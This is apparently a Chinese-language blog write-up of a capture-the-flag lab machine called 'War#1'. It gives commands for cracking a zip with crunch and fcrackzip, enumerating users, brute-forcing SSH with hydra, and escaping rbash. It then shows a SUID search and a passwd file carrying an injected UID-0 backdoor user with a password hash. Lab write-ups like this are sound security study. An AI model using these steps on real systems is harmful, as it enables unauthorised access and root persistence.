---
layout: gears
title: War#1
date: 2020-12-30 19:31:43
tags:
---

## 0x00 信息收集

## 0x01 smb攻击

crunch 生成密码的一个软件 `@%%,`这个是给的密码参数。



```
crunch 4 4 -t @%%, -o words
最小4位，最长 4位
```

`fcrackzip -D -p  words  -u msg_horda.zip`   

![image-20201230195717931](https://i.loli.net/2020/12/30/wCIymWxXGkng4Bj.png)

```
enum4linux  -r 192.168.43.200 |grep Local
```

枚举用户

hydra -L 指定用户文件 -p P 大写是文件，小写是字符

`hydra -L user.txt -p 3_d4y ssh://192.168.43.200` 爆破ssh

```
echo $SHELL 查看当前的shell rbash
```

![image-20201230200130354](https://i.loli.net/2020/12/30/DLdlAG6k1ycK9Ix.png)

**开始读rbash进行绕过**

```
ssh marcus@192.168.43.200 -t "bash -noprofile"  
```

好，绕过完毕。

## 0x03 权限提升

```
find / type f -perm -u=s 2>/dev/null 把错误信息重定向到/dev/null
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:marcus:/home/marcus:/bin/rbash
dem0:$1$dem0$LWnFTKnLwV4gGwR8yOaTr1:0:0:root:/root:/bin/bash
```

